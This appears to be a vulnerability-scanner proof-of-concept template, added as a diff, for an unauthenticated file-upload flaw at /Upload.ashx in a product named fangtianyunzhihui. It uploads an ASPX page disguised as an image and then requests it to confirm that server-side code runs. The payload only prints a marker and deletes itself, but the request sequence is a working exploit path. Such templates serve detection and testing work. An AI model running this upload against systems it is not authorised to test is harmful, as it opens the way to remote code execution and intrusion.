@@ -1,0 +1,40 @@
+name: poc-yaml-fangtianyunzhihui-Upload-File-upload
+transport: http
+
+
+set:
+  randbody: base64Decode("cGJveWpubnJmaXBtcGxzdWtkZWN6dWRzZWZ4bXl3ZQ==")
+  rboundary: randomLowercase(8)
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Upload.ashx
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: 
+       "------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"qwe.aspx\"\r\n\
+        Content-Type: image/jpg\r\n\
+        \r\n\
+        <%@ Page Language=\"C#\" %><% Response.Write(\"{{randbody}}\"); System.IO.File.Delete(Request.PhysicalPath); %>\r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200
+    output:
+      search: '"(?P<uploadfile>.*?\\.aspx)".bsubmatch(response.body)'
+      uploadfile: search["uploadfile"]
+
+  r1:
+    request:
+      method: GET
+      path: /UploadFile/CustomerFile/{{uploadfile}}
+    expression: response.status == 200 && response.body.bcontains(bytes(randbody))
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140918297
